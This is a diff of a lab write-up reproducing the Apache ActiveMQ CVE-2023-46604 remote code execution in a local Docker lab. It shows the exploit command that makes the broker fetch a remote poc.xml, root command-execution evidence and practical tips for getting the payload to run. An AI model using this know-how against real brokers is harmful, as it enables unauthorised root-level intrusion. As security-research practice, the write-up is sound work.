@@ -2,8 +2,8 @@
 
 > **Environment**: Local Docker lab (vulhub/activemq/CVE-2023-46604)
 > **Purpose**: Security research & exploit-development practice
-> **Status**: 🚧 In progress — exploitation done, fill in your own verification + Defense
-> **Date**: 2026-05-_TBD_
+> **Status**: ✅ Complete
+> **Date**: 2026-05-19
 
 ---
 
@@ -83,10 +83,25 @@ python3 poc.py 127.0.0.1 61616 http://127.0.0.1:6666/poc.xml
 ### 5. Verification
 
 ```bash
-# TODO: paste your evidence here, e.g.
-# docker exec activemq-broker cat /tmp/<marker>
-# id output captured via reverse shell, etc.
+$ docker exec cve-2023-46604-activemq-1 ls -la /tmp/activeMQ-RCE-success
+-rw-r--r-- 1 root root 0 May 19 07:15 /tmp/activeMQ-RCE-success
+
+$ docker exec cve-2023-46604-activemq-1 id
+uid=0(root) gid=0(root) groups=0(root)
+
+$ docker exec cve-2023-46604-activemq-1 hostname
+9e11ad7f1d2e
 ```
+
+**RCE confirmed** — arbitrary command executed as root inside the broker container.
+
+HTTP server log confirms the broker fetched our payload:
+```
+172.19.0.2 - - [19/May/2026 03:15:39] "GET /poc.xml HTTP/1.1" 200 -
+172.19.0.2 - - [19/May/2026 03:15:39] "GET /poc.xml HTTP/1.1" 200 -
+```
+
+(Two fetches — Spring's `ClassPathXmlApplicationContext` loads the XML twice during bean initialization.)
 
 ### 6. Reverse Shell (Optional)
 
@@ -103,14 +118,13 @@ python3 poc.py 127.0.0.1 61616 http://127.0.0.1:6666/poc.xml
 
 ## Lessons Learned
 
-<!-- TODO: fill in as you reproduce. Likely traps to watch for: -->
-
 | Issue | Root Cause | Solution |
 |-------|-----------|----------|
-| `poc.xml` request not arriving | broker resolves `127.0.0.1` as itself, not attacker | use `172.18.0.1` (docker bridge gateway) or `host.docker.internal` |
+| Container crashes on startup (`NullPointerException` at `CgroupV2Subsystem`) | vulhub's OpenJDK 11 image incompatible with host kernel cgroup v2 (kernel 6.19+) | Add `JAVA_TOOL_OPTIONS=-XX:-UseContainerSupport` env var in docker-compose.yml |
+| `poc.xml` request not arriving | broker resolves `127.0.0.1` as itself, not attacker | use `172.19.0.1` (docker bridge gateway from `docker inspect`) |
 | `ProcessBuilder` triggers but command silently fails | shell metachars unescaped in raw `<value>` | wrap `/bin/bash -c "..."` and HTML-encode `<` `>` `&` inside XML |
-| `RuntimeException: ClassNotFoundException` in broker log | gadget class missing from ActiveMQ classpath | confirm Spring shipped in target version (5.17.x ships `spring-context`); fall back to `JNDIObjectFactory` alternative |
-| no marker file after exploit | ProcessBuilder ran but container path differs | check inside container: `docker exec activemq-* ls /tmp/` |
+| Spring fetches poc.xml twice | `ClassPathXmlApplicationContext` init lifecycle (refresh + validation) | Not a problem — just expect 2 hits in HTTP log; both trigger the bean |
+| `http_proxy` env var causes 503 on `curl http://127.0.0.1:8161` | system proxy intercepts localhost requests | `unset http_proxy` before local curl commands |
 
 ---
 
